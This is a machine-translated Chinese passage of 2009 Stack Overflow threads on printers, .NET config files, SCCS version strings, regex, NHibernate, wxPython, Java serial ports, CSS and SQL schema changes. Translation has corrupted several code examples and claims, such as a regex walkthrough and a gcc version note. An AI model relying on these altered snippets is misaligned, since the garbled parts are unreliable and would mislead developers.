我至少使用黑白激光。

但是，当在图表上表示大量信息时，颜色很有帮助。我一直在寻找转向彩色激光打印机。需要注意的重要一点是，您会找到一台打印机，它可以通过一次在硒鼓中打印所有四种碳粉颜色。大多数便宜的激光打印机将纸张发送多达 5 次，每种颜色加黑色一次。这会更快地用完打印机中的硒鼓。

对于您看到的任何打印机，请务必计算每页的成本，包括碳粉和硒鼓。如果您能找到几年前存在第三方墨粉的打印机型号，请仔细查看。我知道 Brother 和 Okidata 打印机非常适合商业/规格类型打印，并且具有市场上最低的碳粉成本。我的下一台打印机将是其中之一。

除此之外，尝试找到一台打印机： - 具有网络功能（无线很不错） - 双面打印器很不错。我喜欢用纸的背面在旁边的印刷纸上做笔记。- 具有多功能能力。我住在我的传真到电子邮件扫描仪。我将它通过电子邮件发送给我的个案经理并适当地命名并归档文件。如果我再次需要它，我可以再次打印 PDF。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T17:42:35.093

要求？设计文件？那些是什么？

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-27T17:46:44.367

我已经完成了相当多的大型规范文档，并且有一次建立了一个工作流程来支持一个由 5 名分析师组成的团队协作处理一个非常大的保险承保系统规范文档。打印机应具有以下功能集：

*   双面打印 - 这样您就可以将超过 50 页左右的文档装订成小册子。这是大型文档的一大胜利。

*   A3 打印 - 这样您就可以打印出更大的图表，例如数据库模型。

*   PostScript - PCL 仍然存在不时受到影响的限制。此外，Windows 以外的任何设备都可以更好地使用 Postscript 打印机。

*   如果您想将多台计算机连接到网络连接。

颜色是可选的，很不错。

需要注意的一件事是，您可以从 ebay 上购买高规格的激光打印机来购买花生。我有一台 HP 9000DTN，它是一台带有双面打印单元的大型 50ppm A3 打印机。这种类型可以选择配页器、订书机、容量为 2000 页的进纸器和用作复印机的扫描仪。它有点太大和笨重，但它在 ebay 上花了我 400 英镑。你可能想要一些更小的东西（直到它到达我才意识到它有多大），尽管像复印机位这样的东西可能是一个胜利。我还看到带有双面打印单元和低使用率（12,000 张）的 HP 4xxx 打印机售价约为 100 英镑。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-27T17:49:34.580

要求？有时——但通常是当我们与其他部门开会讨论时，然后只讨论讨论点。代码？绝不是全部作品；只有片段；但同样，仅用于审查和讨论（更常见的是，只是投影它）。设计文件？很少。

现在我喜欢做的是将我的图表和涂鸦投影到白板上——这使我（团队也）可以使用我们的干擦标记来标记投影仪显示的内容——如果我们喜欢结果，我会更新我的文档并重复该过程...

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-27T17:51:06.480

我曾经回到点阵/扇形折纸时代。使用现代页面打印机，很容易将页面全部弄乱。我们现在有了更大的显示器，让您一次可以看到更多的代码。扔在平板电脑上做笔记，我的桌子上没有纸了。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-01-27T19:04:32.087

有时。我在工作中使用两个屏幕，所以大多数时候我也可以查看规格和其他内容。

如果我打印，那么每张 A4 纸两页，双面，以减少纸张浪费。

# .net - System.Configuration.ConfigurationManager.AppSettings 使用哪个文件？

> ID：484371
> 
> 赞同：10
> 
> 时间：2009-01-27T17:33:32.740
> 
> 标签：.net, configuration-files

我想知道 ConfigurationManager 正在使用哪个 *.config 文件。我怎么能弄清楚呢？

例如，您可能正在更改工作目录并从各种路径执行库。我希望有一种方法可以在我的 Trace 中显示类似“从 c:\MyApp\app.config 读取 AppSettings”的内容。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-27T17:49:41.163

```
System.Configuration.ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None).FilePath 
```

# c - SCCS “what” 字符串没有被编译器优化掉

> ID：484375
> 
> 赞同：3
> 
> 时间：2009-01-27T17:34:05.360
> 
> 标签：c, compiler-optimization

我们尝试在二进制对象中嵌入 what 字符串，以便我们可以看到已部署的可执行文件或共享库的版本号。通常我们将标准 CVS Id 信息嵌入到这个 what 字符串中。例如，我们可能嵌入：

```
const char cvsid[] = "@(#)OUR_TEAM_staging_remap_$Revision: 1.30 $ $Name:  $"; 
```

在 C 代码中。

从人（1）什么：

> what 实用程序在每个文件名中搜索出现的模式 @(#)，SCCS get 命令（请参阅 sccs-get(1)）替换了 @(#) ID 关键字，并打印出 ", >, NEWLINE、\ 或 NULL 字符。

该变量只有一个实例，并且从未被引用。有人建议这可能会被编译器优化掉。

多年来，我一直在 C 和 C++ 以及各种编译器中使用这种技术，但我还没有看到什么字符串被优化掉了。

任何人都知道为什么它们没有被优化掉？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T17:36:29.723

通常这不会发生，因为无关字符串的成本很低，并且在这种情况下很有用，除其他外（例如，存储一堆字符串资源，只有代码中实际引用的第一个资源）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:41:57.497

它们可能不会被优化掉，因为您的编译器知道这些字符串可以用于这些目的。

当然，编译器完全可以优化掉它，只要程序的行为，更确切地说是可观察的行为，没有改变。这意味着对 volatile 的写入和读取顺序，并且对库函数的调用不会改变。

通过在您的应用程序中优化这样的字符串，我想这种行为不会改变。但是编译器想要可用并且尽量不以用户的方式进行攻击。这就是为什么它们也包含有用的扩展。如果您想确保它不会偶尔被优化，也许可以查看编译器扩展。GCC 有一个`unused`属性，它不会对未使用的对象发出警告。也许那个或类似的东西可以帮助你变量没有被优化掉。

从语言的角度来看，虽然有一个实用程序可以强制编译器保留它。

**编辑：**[这里](http://groups.google.com/group/comp.std.c++/browse_thread/thread/ba1d43c76f141c2c?hl=en)有一篇关于该主题的 usenet 帖子，有有用的答案。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-31T07:22:04.823

直到最近（我在 2005 年年中发现了这个问题），还可以使用：

```
static const char sccs[] = "@(#)%W% %E%"; 
```

或源代码中的类似内容，GCC 和大多数其他编译器不会对其进行优化。大约从那个时候开始发布 GCC（可能是 GCC 4.0.x，起源于 2005 年 4 月），这些常量字符串被排除在二进制文件之外。因此，我不得不四处修改我的源代码以使变量在外部可见。编译器不可能单独查看目标文件并得出未使用该字符串的结论，因为可以想象文件之外的某些内容可能会引用它。所以，我的文件现在包含：

```
#ifndef lint
extern const char jlss_id_filename_c[];
const char jlss_id_filename_c[] = "@(#)$Id$";
#endif /* lint */ 
```

好的——这是一个混合体；我确实使用 RCS 来存储源代码，但我仍然更喜欢`what`用于`ident`识别文件 - 再加上我自己的 hacked`what`可以做到这两点`what`，`ident`再加上我自己的一些调整。但我在一些文件中都有声明 - 不是全部 - 以及所有文件中的定义。（在一些现在不记得的警告标志下，当变量在被声明之前被定义时，我收到了警告。可能是 GCC 中的一个更改解决了这个问题；我不确定了。）

当我创建一个新文件时，我的模板生成器将“filename_c”替换为正在生成的文件的适当名称。标题也类似——尽管标识字符串只嵌入一个文件中以避免多个定义。

我更喜欢带有静态常量的旧系统——但这已经为我工作了 3 年多。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2015-08-03T23:16:29.763

（是的，我知道这个问题很久以前就被问过了。但是这种新的回答方式是可用的，所以....）

在`gcc`（至少在 3.3 及以下版本中），现在有编译器指令`__attribute__((unused))`将变量标记为“已知它*可能*未被引用”以抑制警告，并将`__attribute__((used))`其标记为已使用（因此不是优化的候选对象)，即使没有其他代码实际引用它。

所以这可能会为你做：

```
static const char what_ident[] __attribute__((used)) = "@(#) $Id$"; 
```

如果`linker`仍然优化它，那么您可能需要将它放在标记为*保持*的部分中，而不管链接时间引用如何。

```
static const char what_ident[] __attribute__((section("what"), used)) = "@(#) $Id$"; 
```

并添加 gcc 选项`-Wl,-bkeepfile:file.o`，这样链接器就不会抑制 file.c 输出中未引用的部分。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T18:12:16.640

Microsoft 的 Visual C++ 2005 有一个链接器选项，它应该控制它对未使用数据 `/OPT:UNREF`的处理方式：强制链接器保留未使用的数据，`/OPT:REF`允许它删除它。

但是，在我的简单测试中，该选项对语句没有影响

```
static char VersionString[] = "HELLO_WORLD 2.0"; 
```

无论标志如何，该字符串都出现在发布和调试二进制文件中。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-07-21T22:30:39.590

如果没有“static”关键字，变量就不能被优化掉，因为另一个模块可能会声明一个对它的引用（使用 extern）。由于 C/C++ 通常一次编译一个文件，因此编译器无法知道是否存在外部引用。

通过添加 static 关键字，您可以告诉编译器该名称仅在编译中可见，使用和优化它成为可能。

我认为如果对象格式允许，链接器可以检测到未使用的全局变量并对其进行优化，尽管我不确定是否有人这样做。

# .net - 正则表达式替换帮助

> ID：484376
> 
> 赞同：2
> 
> 时间：2009-01-27T17:34:22.083
> 
> 标签：.net, regex

使用 .NET 框架，我试图用一个斜杠替换字符串中的双斜杠字符，但它似乎正在删除一个额外的字符，我不知道为什么。

我有一个字符串：

```
http://localhost:4170/RCRSelfRegistration//Default.aspx 
```

我的正则表达式是：

```
[^(://|:\\\\)](\\\\|//|\\/|/\\) 
```

返回值为：

```
http://localhost:4170/RCRSelfRegistratio/Default.aspx 
```

可以看到 RCRSelfRegistration 中的 n 被去掉了。我不确定为什么。

```
/// <summary>
/// Match on double slashes (//, \\, /\, \/) but do not match :// or :\\
/// </summary>
private const string strMATCH = @"[^(://|:\\\\)](\\\\|//|\\/|/\\)";

/// <summary>
/// Replace double slashes with single slash
/// </summary>
/// <param name="strUrl"></param>
/// <returns></returns>
public static string GetUrl(string strUrl)
{
    string strNewUrl
    System.Text.RegularExpressions.Regex rxReplace =
      new System.Text.RegularExpressions.Regex(strMATCH);

    strNewUrl = rxReplace.Replace(strUrl, "/");

    return strNewUrl;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T17:39:10.607

`[^(://|:\\\\)]`不像你想象的那样工作。

`[]`是一个字符范围 - 它匹配该范围中包含的单个字符。

`[^:]`将匹配除冒号以外的任何字符。这可能更接近你想要的。

您可能真正想要的是一个[零宽度的后向断言](http://www.regular-expressions.info/lookaround.html)：`(?<!:)`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-27T17:40:01.947

正则表达式 "[^(://|:\\)]" 的第一部分匹配任何不是 "(:/|\" 的字符（正如 tomalak 指出的那样，negset 匹配其中的所有字符，没有进一步的处理逻辑），其中包括紧接在“//default.aspx”之前的“n”——它不是一个零宽度断言。

您可能想要做的是将模式的那部分更改为零宽度后视，以确保斜杠字符前面没有冒号。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-27T17:45:59.080

您需要的是像这样的组背后的负面外观：

```
(?<!:)(\\\\|//|\\/|/\\) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T17:39:19.500

正则表达式的否定部分 [^(://|:\\)] 与 n 匹配，因此将其删除。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T17:41:00.713

您是否尝试过使用字符串的替换方法。它不像正则表达式替换那样优雅，但只要你不在一个循环中对巨大的字符串执行数百次它就可以达到你的目的：

```
string myString = oldString.Replace(@"\\", @"\").Replace("//", "/"); 
```

否则，您可能会在 Regex 上花费大量时间。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T17:50:22.720

我认为您只需要用循环替换简单的字符串即可。将所有“//”替换为“/”。您需要一个函数来保存搜索位置并让您遍历字符串。一旦到达字符串的末尾，请再次执行此操作，直到您在通过时不进行任何替换。

例如：

///a//a/a////

通过 1

//一个/一个/一个//

通过 2

/a/a/a/

# nhibernate - 使用 Fluent NHibernate 命名为“Order”的 DB 列

> ID：484381
> 
> 赞同：4
> 
> 时间：2009-01-27T17:36:05.060
> 
> 标签：nhibernate, fluent-nhibernate

我发现我正在处理的遗留数据库的一个表有一个名为“Order”的列。不幸的是，我无法更改数据库结构。
我流利的 ​​NHibernate 类看起来像

```
 public class SiteMap : AutoMap<Site>
{
    public SiteMap() {
        WithTable("Sites");
        Id(x => x.ID, "Id")
            .WithUnsavedValue(0)
            .GeneratedBy.Identity();
        Map(x => x.Name, "Name");
        //various columns mapping and then...
        Map(x => x.SiteOrder, "Order");
    }
} 
```

我不知道问题是 FluentNH 还是 NHibernate 本身，但我可以确认问题出在“订单”保留名称上。

如何解决这个问题？

**更新：**按照建议输入 [Order] 表格有效。谢谢！
但现在我只链接到 SQL2005？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-27T17:39:55.520

尝试将 Order 放在反引号中：``Order `. 由于 FluentNH 在运行时生成 HBM 文件，我想这应该可以解决问题。`

 `* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T17:41:08.060

幕后的数据库是什么？

使用 MS SQL，您应该能够通过用方括号将“订单”字段括起来来解决此问题

```
Map(x => x.SiteOrder, "[Order]"); 
```

编辑：方括号应该适用于所有版本的 MS SQL 以及 MS Access。不确定其他平台，但它也可能在其他一些平台上工作。

# vbscript - 使用 VBscript 读取用户权限

> ID：484388
> 
> 赞同：3
> 
> 时间：2009-01-27T17:37:06.710
> 
> 标签：vbscript, privileges

我正在尝试确定用户（运行脚本的用户，有或没有运行身份）是否应用了某些用户权限策略。由于**secedit /analyze**仅参考实际设置并忽略通过组成员身份进行的权限传播，因此在这种情况下它是无用的。

我指的是这些特权： SeTcbPrivilege SeIncreaseQuotaPrivilege

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-13T06:35:27.087

我不知道 SeTcbPrivilege，但是看看这篇[文章](http://windowsitpro.com/article/articleid/74620/jsi-tip-3301-how-can-i-report-the-privileges-granted-to-users-or-groups.html)如何确定用户是否具有 SeIncreaseQuotaPrivilege 权限。基本上，它讨论了如何使用 Windows 2000 Server 资源工具包中的 Showpriv.exe

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-23T16:00:36.507

[除了编写脚本之外，您还可以使用 Quest 的报告](http://www.scriptlogic.com/products/reporter)器获取用户权限报告以及许多其他安全报告。

我们在公司中使用此工具来获取安全合规性报告和发现用户权限。

# python - 静态文本项目在 wx.StaticBox 中消失

> ID：484389
> 
> 赞同：1
> 
> 时间：2009-01-27T17:38:10.953
> 
> 标签：python, wxpython, wxwidgets, boxsizer

我正在一个垂直大小调整器中创建一个 staticbox 和一个 staticboxsizer。一切对我来说都很好，但不适用于客户的环境。

静态框中的所有内容都会显示，但标签除外。下面的片段显示了我如何构造 staticboxsizer。

```
 sbox2 = wx.StaticBox(self, wx.ID_ANY, 'CH1 Only')
    sboxsizer2 = wx.StaticBoxSizer(sbox2, wx.VERTICAL)

    gsizer9 = wx.GridBagSizer(1,1)
    gsizer9.Add(comp.MinMaxLabel_21, (1,0), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.MinMax_21, (1,1), (1,1), wx.ALL, 1)

    gsizer9.Add(comp.MinMax_19, (2,1), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.MinMaxLabel_19, (2,0), (1,1), wx.ALL, 1)

    gsizer9.Add(comp.VcOS_15, (3,1), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.MinMaxLabel_22, (3,0), (1,1), wx.ALL, 1)

    gsizer9.Add(comp.MonLabel_18, (0,3), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.MonLabel_21, (0,4), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.MonLabel_17, (0,5), (1,1), wx.ALL, 1)
    comp.MonLabel_22.Wrap(40)
    gsizer9.Add(comp.MonLabel_22, (0,6), (1,1), wx.ALL, 1)
    comp.MonLabel_19.Wrap(40)
    gsizer9.Add(comp.MonLabel_19, (0,7), (1,1), wx.ALL, 1)

    gsizer9.Add(comp.VcOS_10, (1,3), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.VcOS_11, (1,4), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.VcOS_12, (1,5), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.VcOS_13, (1,6), (1,1), wx.ALL, 1)
    gsizer9.Add(comp.VcOS_14, (1,7), (1,1), wx.ALL, 1)

    sboxsizer2.Add(gsizer9, 0,0,0)
    vsizer4.Add(sboxsizer2, 0,0,0) 
```

comp.MinMaxLabel_* 返回一个 wx.StaticText(label='blah')，没什么花哨的，只是一个包装器，它适用于其他尺寸器中的其他 ~400 个项目。但在 StaticBox 或 StaticBoxSizers 中，客户的设置上没有显示 StaticText。

通常它在我的设置中显示为： [alt text http://img152.imageshack.us/img152/8758/normalnu9.jpg](http://img152.imageshack.us/img152/8758/normalnu9.jpg)

这就是我在客户设置中得到的： [alt text http://img258.imageshack.us/img258/2351/problematiczo2.jpg](http://img258.imageshack.us/img258/2351/problematiczo2.jpg)

两种设置都具有相同的 wxpython 版本，即 2.8.9.1。但 2.8.* 也显示在我的环境中。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-29T12:02:11.590

wxStaticBox 的源代码在绘画代码中做了不同的事情，这取决于是否启用了 XP 主题。在没有主题的屏幕截图中，一切看起来都很好，在启用了主题的屏幕截图中，标签丢失了。你能在你的系统上尝试启用主题，看看标签是否显示正常吗？或者您的客户可以暂时禁用主题并检查是否可以解决问题？

此外，您使用什么作为标签的父级 - 框架/对话框或静态框？我无法从发布的代码中看到它，但我会使用静态框。也许这也会有所作为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-30T19:45:01.813

comp.Component 使用主面板 -ScrolledPanel- 作为父面板

```
class MyBackground(ScrolledPanel):
    def __init__(self, parent, components):
        ScrolledPanel.__init__(self, parent, -1, style=wx.TAB_TRAVERSAL)
        self.setFont()
        comp = Components(components, self)

...
...
app = wx.PySimpleApp(0)
wx.InitAllImageHandlers()
frame = wx.Frame(None, -1, 'Set Limits', size=(800,600), style=wx.DEFAULT_FRAME_STYLE)
panel = MyBackground(frame, components) 
```

作为一个临时但成功的解决方案，我删除了 staticboxes 并将 staticboxsizer 更改为 gridbagsizer，一切正常:) 很可能问题与您所说的主题有关，我猜更改标签的前景色可能只是工作。

谢谢您的回复

# java - 如何从串口读取文本？

> ID：484392
> 
> 赞同：1
> 
> 时间：2009-01-27T17:38:58.580
> 
> 标签：java, string, serial-port, bytearray

我正在尝试通过 Java 从 Windows 串行端口读取数据。我有 javax.comm 库并且能够获取一些数据但不正确的数据。当我将端口读入字节数组并将其转换为文本时，我得到一系列字符，但没有真正的文本字符串。我试图将字节数组指定为“UTF-8”和“US-ASCII”。有谁知道如何从中获取真实文本？

这是我的代码：

```
while (inputStream.available() > 0) {
 int numBytes = inputStream.read(readBuffer);
 System.out.println("Reading from " + portId.getName() + ": ");
 System.out.println("Read " + numBytes + " bytes");
}

System.out.println(new String(readBuffer));
System.out.println(new String(readBuffer, "UTF-8"));
System.out.println(new String(readBuffer, "US-ASCII")); 
```

前三行的输出不会让我复制和粘贴（我假设因为它们不是普通字符）。这是十六进制的输出：78786000e67e9e60061e8606781e66e0869e98e086f89898861878809e1e9880

我正在从一个以字符串格式输出的 Hollux GPS 设备读取数据。我肯定知道这一点，因为我是通过 C# 完成的。

我在 C# 应用程序中使用的通信设置是：波特率：9600 数据位：8 停止位：1 奇偶校验：无

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-27T17:49:27.420

连接的设备很可能不使用文本协议。许多设备使用二进制消息格式，其中可能嵌入了文本，但使用更紧凑的代码表示其他信息。

请编辑您的问题并提供更多信息，例如您通过串行端口与之通信的设备，以及您从正在运行的代码中获得的输出。要添加的另一个有用的输出是打印您已读取数据的十六进制表示形式。一个快速而肮脏的方法如下：

```
import java.math.BigInteger;
...
System.out.println(new BigInteger(1, readBuffer).toString(16)); 
```

* * *

我没有使用过Holux GPS，但我用javax.comm 编写了一个Garmin 接口。在这种情况下，设备默认使用专有（二进制）Garmin 协议，但可以在设备上启用（基于文本的）NMEA 0183 协议。您是否可能正在接收专有的 Holux 消息格式，并且需要在 GPS 单元上使用一些命令来切换协议？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-28T13:59:51.970

我无法从您的代码中看出，但看起来您正在使用`java.io.InputStream`读取对象。您应该使用`java.io.BufferedReader`或`java.io.InputSreamReader`。

有很多方法可以做到这一点，但这是我们使用的：

```
javax.comm.SerialPort port = ...{initialize your serial port}
BufferedReader portReader = 
    new BufferedReader(new InputStreamReader(port.getInputStream()));

try {
    String line = portReader.readLine();
} catch(IOException e) { ... } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-06-02T12:33:02.433

```
 byte[] readBuffer = null;
                try {
                    while (inputStream.available() > 0) {
                        int n = inputStream.available();
                        readBuffer = new byte[n];
                        inputStream.read(readBuffer, 0, n);
                    }
                    String y = new String(readBuffer, StandardCharsets.ISO_8859_1);
                    String str = new String(readBuffer, "UTF-8");
                    jTextField3.setText("    " + str+ "    "); 
```

请我从二进制字符串

# service - .Net 1.1 Windows 服务中未调用 OnStart

> ID：484394
> 
> 赞同：1
> 
> 时间：2009-01-27T17:39:10.233
> 
> 标签：service, .net-1.1

我有一个在一台服务器上运行的 .Net framework 1.1 Windows 服务，但在另一台服务器上没有调用 OnStart 方法。我有一个 Trace 语句作为 OnStart 覆盖的第一行，它没有被执行。没有抛出异常，并且 Windows 服务控制管理器认为服务已正确启动。

任何人都知道什么可以阻止 OnStart 方法被调用？

编辑：这是跟踪输出的 .config 设置。

```
<configuration>
    <system.diagnostics>
        <trace autoflush="true" indentsize="4">
            <listeners>
                <add name="LogFileWriter" type="System.Diagnostics.TextWriterTraceListener,System" 
                        initializeData="c:\interface.log" />
            </listeners>
        </trace>
    </system.diagnostics>
</configuration> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T17:49:30.990

如果 OnInit 被调用，则覆盖它并自己设置处理程序

```
protected override void OnInit(EventArgs e) {
  this.Start += new System.EventHandler(OnStart);
  base.OnInit(e);
} 
```

如果未调用 OnInit，将 AutoEventWireup = "true" 添加到 <%@ Page 部分可能会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:50:12.503

如果您将跟踪写入 EventLogTrace 侦听器，则第二台计算机上的服务帐户可能没有足够的权限来访问事件日志。看我对这个问题的回答：

[Windows 服务正在运行，但事件日志不起作用](https://stackoverflow.com/questions/476432/windows-service-running-but-event-logs-not-working#476491)

OnStart 事件中还有哪些其他活动表明该事件未触发？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-02-02T15:16:28.637

这最终成为一个非常模糊的问题，单个服务器阻止服务实例的构造函数运行。

# css - 如何在 html 选项标签内实现两种不同的对齐方式？

> ID：484397
> 
> 赞同：2
> 
> 时间：2009-01-27T17:39:44.367
> 
> 标签：css, xhtml, xhtml-1.0-strict

我有一个带有国家呼叫代码的选择 html 标记。

```
<select name="countryCallingCode" id="countryCallingCode">
    <option value="1"><span class="name">Afghanistan</span><span class="code">+93</span></option>
    <option value="2"><span class="name">Albania</span><span class="code">+355</span></option>
    <option value="3"><span class="name">Algeria</span><span class="code">+213</span></option>
</select> 
```

我希望名称左对齐，代码右对齐。演示文稿应如下所示：

```
Afghanistan                +93   
Albania                   +355   
Algeria                   +213 
```

我已经介绍了 span 元素来使用 CSS 实现这一点。

```
select#countryCallingCode span.name {text-align: left;}
select#countryCallingCode span.code {text-align: right;} 
```

上面的代码，不起作用。此外，span 元素在 XHTML 1.0 strict 的 html 选项标签中似乎无效。

任何想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-27T17:48:06.843

我曾经遇到过这个问题，我所做的是将文本格式化为等宽字体，并在中间填充空格以分隔文本并使每一行的字符数为偶数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T17:48:35.580

尝试这样的事情

```
select {width:100px;}
.name  {float:left;}
.code  {float:right;} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T17:55:17.610

用javascript修改选择框：

找到最长的国家名称，然后修改每个选项，使国家名称和呼叫代码之间有足够的空格。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T18:55:24.307

Mono-spacing 是正确的答案，但是....您可以使用一些 jQuery 重复测量隐藏跨度中的文本字符串非常接近（不完美）。

```
var list = [ ["Afghanistan","+93"], ["Albania","+355"], ["Algeria","+213"] ] ;
var max = 0;
for (n = 0; n < list.length; n++)
{
    var s = list[n][0] + "..." + list[n][1]; 
    $('#dummy').html(s);
    var x = $('#dummy')[0].offsetWidth;
    list[n].push(x);
    if (max < x) max = x;
}

for (n = 0; n < list.length; n++)
{
    var fill = max - list[n][2];
    var s = "...";
    while (true)
    {
        $('#dummy').html(s);
        var x = $('#dummy')[0].offsetWidth;
        if (fill <= x) break;
        s += ".";
    }
    var html = list[n][0] + s + list[n][1];
    $('#countryCallingCode').append($('<option></option').val(n+1).html(html));     
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T19:04:41.790

这是一个与 Scott Evernden 的 JQuery 示例一起使用的单空间 JS 解决方案。我只在 Firefox 中测试过，但这应该足够开始了。

JavaScript

```
var MIN_SPACES_BETWEEN_VALS = 3;

function mkOption(left, right, total)
{
    var str = left;
    var spaces = total - left.length - right.length;
    for(x = 0;x < spaces;x++)
        str += "\xA0";

    var opt = document.createElement("option");
    opt.text = str + right;
    opt.value = right;
    return opt;
}

function populate(selId, vals)
{
    var sel = document.getElementById(selId);

    var maxLeft = -1;
    var maxRight = -1;
    for(idx = 0;idx < vals.length;idx++)
    {
        if(vals[idx][0].length > maxLeft)
            maxLeft = vals[idx][0].length;

        if(vals[idx][1].length > maxRight)
            maxRight = vals[idx][1].length;
    }

    var total = maxLeft + maxRight + MIN_SPACES_BETWEEN_VALS;
    for(idx = 0;idx < vals.length;idx++)
        sel.add(mkOption(vals[idx][0], vals[idx][1], total), null);   
} 
```

的HTML

```
<html>

    <head>
        <script src="selectTest.js">

        </script>
        <style>
            select
            {   
               font-family: Courier, mono;
            }
        </style>
    </head>

    <body>

        <select name="countryCallingCode" id="countryCallingCode">
        </select>
        <script>
            var vals = [["Afghanistan", "+93"], ["Albania", "+355"], ["Algeria", "+213"]];
            populate("countryCallingCode", vals);
        </script>

    </body>

</html> 
```

# unit-testing - JUnit 异常捕获

> ID：484407
> 
> 赞同：1
> 
> 时间：2009-01-27T17:41:39.930
> 
> 标签：unit-testing, hibernate, exception, junit

我正在编写一些依赖于可用数据库的测试用例，因此在 @Before 和 @After 我打开和关闭会话（休眠），以及启动和完成事务。

现在在开发过程中，有时我会在测试用例中遇到异常，因此永远不会调用 @After 并且我无法清理（或回滚我想做的事务）。

我（简要地）检查了文档，但找不到如何捕获这些意外异常，因此我可以回滚并让其余测试正常工作。

任何指针？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T17:45:12.123

根据这个资源：

[http://junit.org/apidocs/org/junit/After.html](http://junit.org/apidocs/org/junit/After.html)

@After 方法保证运行，即使抛出异常。您没有明确调用该方法，是吗？

# sql-server - 重命名列或附加列？就是那个问题

> ID：484411
> 
> 赞同：2
> 
> 时间：2009-01-27T17:42:17.510
> 
> 标签：sql-server, database, database-design

我将要更改一个庞大系统中的几个表，我可能只了解大约 10%。

我想添加三列。其中之一只是对现有列的重命名。我的一部分想要：-

*   重命名列但担心对使用旧名称的系统未知部分的影响。

*   将三列附加到表中，从而使旧列变得多余（随着时间的推移）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T17:45:09.533

如果您*真的*必须这样做，**请务必选择选项二**。

作为记录，我认为**对您不了解的数据库进行结构更改是灾难的根源**，祝您好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-27T17:47:16.130

在源代码中搜索对要重命名的列的引用。
我假设所有源代码都在某个源存储库中。（包括 SQL 脚本。）。

如果发现任何内容，则需要更改它们并测试该功能。

此外，在进行这些更改后，我会在测试环境中对与此相关的功能进行合理的测试。

如果你不这样做，你真的应该选择第二个选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T17:45:33.417

理想的解决方案：了解系统剩余的 90% :)

我将添加两个新列，并将 OLD 拼写错误的列保留原样。即使您的新逻辑使用您的新（固定）列，那么旧报告呢？老逻辑？旧的插入/更新语句？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-27T17:46:04.010

如果您不了解数据库架构，请不要重命名。谁知道你会打破什么:)

一个（有点疯狂）选项是添加基本上只是重命名的列，将当前数据复制到其中，然后重新设计原始列，使其成为返回新列值的计算字段。

这样您就可以重命名，但不会删除旧列。

更安全的选择是扭转局面。使您的新列成为一个计算值，该值只读取旧列并完成它:)

或者，您可以创建一个几乎可以做同样事情的视图。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-27T17:48:40.963

我认为最安全的方法是创建一个**新表**并创建**新的存储过程和方法**。

但最好还是了解整个系统......随着时间的推移，像这样穿上绷带会变得一团糟。

创建新表、存储过程和方法比添加/修改现有的东西更干净。

编辑：我研究过一些有同样问题的网络应用程序。在我之前的多个开发人员以自己的风格添加和修改了一堆东西。我假设你的情况类似。

就像我说的。最好的方法是了解整个系统并对其进行修改。但如果你不能，我发现添加新模块比修改现有模块更好。出现问题时很容易拔掉它。此外，至少现在您确切地知道您的模块是如何工作的。

如果现有应用程序编写得非常好并且易​​于扩展，我认为您不会在这里问这个问题。

所以..我的最后想法。

*   最佳：重命名列并进行相应修改（如果您确切知道系统是如何工作的）
*   安全：添加新列
*   最安全：为新列添加新表并创建新方法（覆盖或重载）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-27T18:13:08.510

